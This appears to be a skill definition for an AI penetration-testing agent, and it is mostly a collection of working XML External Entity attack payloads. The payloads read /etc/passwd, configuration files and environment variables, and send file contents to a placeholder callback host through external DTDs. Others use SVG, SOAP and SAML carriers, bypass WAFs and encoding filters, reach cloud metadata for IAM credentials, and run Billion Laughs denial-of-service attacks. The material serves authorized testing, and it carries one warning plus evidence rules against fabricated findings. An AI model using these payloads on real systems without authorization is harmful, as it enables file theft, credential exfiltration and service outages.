---
name: xxe
description: "XML External Entity exploitation including classic, blind OOB, SVG upload, and filter bypass techniques"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, followRedirects, recordEvidence, getCapturedHeaders]
triggers: ["xxe", "xml external entity", "xml injection", "xml parsing vulnerability", "external entity", "blind xxe", "ootband xxe", "xml entity expansion", "billion laughs", "soap injection"]
contextBoosts: [api]
mitreAttack: ["T1203", "T1190"]
owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration", "OWASP XXE"]
---

# XXE (XML External Entity) Exploitation

## When to Use

- Target accepts XML input: SOAP endpoints, RSS/Atom feeds, SVG uploads, XML-RPC, SAML assertions
- Content-Type is `application/xml`, `text/xml`, `application/soap+xml`, or `image/svg+xml`
- API endpoints that parse XML request bodies (REST or SOAP)
- File upload features accepting SVG files
- WSDL-defined services consuming XML payloads
- SAML SSO login flows that accept XML assertions

## Do Not Use

- Target clearly uses JSON-only APIs with no XML parsing
- Application returns generic "invalid format" errors without processing XML
- Target uses a WAF with strict XML schema validation (XSD) enforcement
- Content-Security-Policy blocks outbound connections for OOB exfiltration
- You have already confirmed XML parser has external entity loading disabled (`no-xml-external-entity`)

## Auth Context

XXE exploitation works regardless of authentication state in most cases. The vulnerability exists in the XML parser, not the application logic. However:

- Authenticated endpoints may expose more sensitive files (e.g., `/etc/shadow`, config files with credentials)
- SVG upload features often require authenticated sessions
- SOAP admin endpoints may require session tokens
- Always capture authentication headers first: `getCapturedHeaders` to retrieve session cookies and tokens
- If the target uses SAML SSO, the XXE in the SAML assertion itself can be exploited pre-authentication

## Classic XXE (In-Band)

In-band XXE returns the entity value directly in the application response. This is the most straightforward variant.

### Basic File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>
```

### Read Application Configuration

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/apache2/apache2.conf">
]>
<config>&xxe;</config>
```

### Read Windows System Files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<config>&xxe;</config>
```

### Read Java Application Properties

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/self/environ">
]>
<env>&xxe;</env>
```

### Test for Vulnerability

Send this as a canary payload — if the parser resolves it, XXE is confirmed:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/null">
]>
<test>&xxe;</test>
```

If the response contains the test value or no XML parsing error, the parser likely processes external entities.

## Blind / Out-of-Band (OOB) XXE

When the application does not return XML entity values in its response, exfiltrate data via DNS or HTTP callbacks.

### HTTP Callback Exfiltration

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-OAST/dtd">
  %dtd;
]>
<root>&send;</root>
```

Host the DTD on your OAST server (`YOUR-OAST`):

```xml
<!ENTITY % param1 "<!ENTITY send SYSTEM 'http://YOUR-OAST/?data=%file;'>">
%param1;
```

### Single-Payload Blind XXE (No External DTD)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY send SYSTEM 'http://YOUR-OAST/?data=%file;'>">
  %eval;
]>
<root>&send;</root>
```

### DNS Exfiltration (When HTTP Outbound Is Blocked)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-DNS-OAST/dns-dtd">
  %dtd;
]>
<root>&exfil;</root>
```

The DNS DTD forces the parser to resolve a subdomain encoding the file contents:

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://%data;.YOUR-DNS-OAST/'>">
%param1;
```

### Blind XXE with Error-Based Leak

If callback exfiltration is blocked, trigger an error that leaks data:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-OAST/error-dtd">
  %dtd;
]>
<root>test</root>
```

Host the error DTD:

```xml
<!ENTITY % param1 "<!ENTITY send SYSTEM 'file:///nonexistent/%file;'>">
%param1;
```

The "file not found" error message in the response may contain the file contents.

## SVG Upload XXE

SVG files are XML. Injecting XXE payloads into SVG uploads can achieve code execution or file read on the server.

### Basic SVG XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
```

### Blind SVG XXE via Image Rendering

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-OAST/svg-dtd">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&exfil;</text>
</svg>
```

### SVG with External Image (SSRF + XXE)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://internal-service/admin">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image href="&xxe;" width="100" height="100"/>
</svg>
```

### SVG with XInclude (No DOCTYPE Control)

When the parser blocks DOCTYPE declarations but still processes XInclude:

```xml
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</svg>
```

### SVG Upload Checks

To test SVG upload endpoints:
1. Upload a benign SVG to confirm upload succeeds
2. Inject `<!DOCTYPE>` and `<!ENTITY>` declarations
3. Check if the server-side rendering returns the resolved entity value (in-band)
4. If not, use OOB callbacks in the SVG payload
5. Check if the server re-encodes or sanitizes the SVG before storage/display

## SOAP / WS-Federation XXE

SOAP messages are XML by definition. Target the SOAP body or envelope with XXE.

### SOAP Body XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser xmlns="http://example.com/">
      <userId>&xxe;</userId>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

### WS-Federation SAML Assertion XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_assertion1" Version="2.0">
  <saml:Subject>
    <saml:NameID>&xxe;</saml:NameID>
  </saml:Subject>
</saml:Assertion>
```

### SOAP with OOB Exfiltration

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-OAST/soap-dtd">
  %dtd;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <query>&send;</query>
  </soap:Body>
</soap:Envelope>
```

## Parameter Entity XXE

Parameter entities (`%name`) are resolved within the DTD subset. They bypass restrictions that block regular entity declarations.

### Basic Parameter Entity

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>
```

### Parameter Entity with External DTD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://YOUR-OAST/param-dtd">
  %dtd;
]>
<root>&send;</root>
```

External DTD (`http://YOUR-OAST/param-dtd`):

```xml
<!ENTITY % param1 "<!ENTITY send SYSTEM 'http://YOUR-OAST/?data=%file;'>">
<!ENTITY % file SYSTEM "file:///etc/passwd">
%param1;
```

### Parameter Entity to Bypass WAF

WAFs often scan for `<!ENTITY` in the internal subset. Parameter entities allow you to move entity declarations into an external DTD, evading the WAF:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://YOUR-OAST/bypass-dtd">
  %dtd;
]>
<root>&data;</root>
```

External DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % data "<!ENTITY exfil SYSTEM 'http://YOUR-OAST/?data=%file;'>">
%data;
```

## Filter Bypass Techniques

### PHP `php://filter` (Read Base64-Encoded Source)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<config>&xxe;</config>
```

Decode the Base64 output to recover the PHP source code.

### UTF-7 Encoding Bypass

If the parser expects UTF-7 but the WAF only scans for ASCII:

```xml
+ADw-?xml version+AD0-”1.0” encoding+AD0-”UTF-7”?+AD4-
+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-
```

Note: UTF-7 bypass is rarely effective against modern parsers but useful for legacy systems.

### BOM (Byte Order Mark) Bypass

Prepend a UTF-8 BOM (`EF BB BF`) before the XML declaration to bypass parsers that only check the first bytes for `<?xml`:

```
\xEF\xBB\xBF<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### CDATA Wrapping Bypass

When input filtering blocks `<` or `>` characters, wrap the payload in a CDATA section:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><![CDATA[&xxe;]]></root>
```

### Double Encoding

If the application URL-decodes but the parser decodes again:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "%25%36%36%25%36%39%25%6C%25%65%25%2F%25%65%25%74%25%63%25%2F%25%70%25%61%25%73%25%73%25%77%25%64">
]>
<root>&xxe;</root>
```

### XML Schema Validation Bypass

When a strict XSD is enforced, inject XXE into fields that accept free-text:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>test@example.com</email>
</user>
```

If all fields are validated, try injecting the DOCTYPE between the XML declaration and root element — some parsers still process it.

## XXE to SSRF

XXE can be used to make the server initiate HTTP requests to internal resources.

### Basic SSRF via XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service:8080/admin">
]>
<request>&xxe;</request>
```

### SSRF to Cloud Metadata

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<metadata>&xxe;</metadata>
```

AWS IAM credentials from metadata:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
```

### SSRF to Internal Services

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:6379/">
]>
<redis>&xxe;</redis>
```

Common internal targets:
- `http://internal-admin-service/` — admin panels
- `http://metadata.google.internal/` — GCP metadata
- `http://169.254.169.254/` — AWS/Azure metadata
- `http://localhost:6379/` — Redis
- `http://localhost:3306/` — MySQL (will return binary data)

## Billion Laughs DoS

XML entity expansion attacks consume memory exponentially. This is a denial-of-service payload.

### Classic Billion Laughs

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

This expands `&lol;` 10^9 times, consuming ~3 GB of memory.

### Quadrillion Laughs

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
  <!ENTITY lol10 "&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;">
  <!ENTITY lol11 "&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;">
  <!ENTITY lol12 "&lol11;&lol11;&lol11;&lol11;&lol11;&lol11;&lol11;&lol11;&lol11;&lol11;">
]>
<lolz>&lol12;</lolz>
```

### Internal Entity Expansion (No External Entities)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<root>&d;</root>
```

**Warning:** Billion Laughs attacks cause real damage. Only use against targets you have explicit authorization to test. Document impact as a DoS finding with severity rating.

## Anti-Hallucination Rules

1. **Never claim file read without evidence.** If you send a `file:///etc/passwd` payload, you must see actual file content (UIDs, home directories) in the response. `root:x:0:0` is evidence. An empty response or generic error is not.

2. **Never claim blind XXE worked without a callback.** You must have an OAST callback with the expected data. If OAST shows no inbound request, the XXE did not fire.

3. **Never claim SVG XXE worked without rendering evidence.** The SVG must be processed by a server-side renderer (ImageMagick, librsvg, etc.). An uploaded SVG displayed as an image in a browser does not prove server-side parsing.

4. **Never claim DoS without measurement.** If you send a Billion Laughs payload, document the actual resource consumption or service disruption. "The payload is large" is not evidence of DoS.

5. **Distinguish parser behavior from vulnerability.** A parser that rejects external entities is not vulnerable. A parser that processes but returns errors is partially vulnerable. A parser that returns entity content is fully vulnerable.

6. **Verify with canary payloads.** Before attempting file reads, send `file:///dev/null` or `file:///nonexistent` to confirm the parser resolves entities at all.

7. **Always use `recordEvidence`** to capture the raw response containing entity resolution. Future analysis must see the actual data, not your summary.

8. **Never mix exploitation and reconnaissance.** First confirm the parser resolves entities (canary), then attempt targeted reads. Jumping to `/etc/shadow` without confirming entity resolution leads to false negatives.

9. **Document filter behavior.** If certain characters or keywords are blocked, record exactly what triggers the block. This informs bypass technique selection.

10. **Cross-reference with Response Gate.** If the LLM claims to have read a file but no entity content appears in the raw HTTP response, the Evidence Gate must reject the claim.
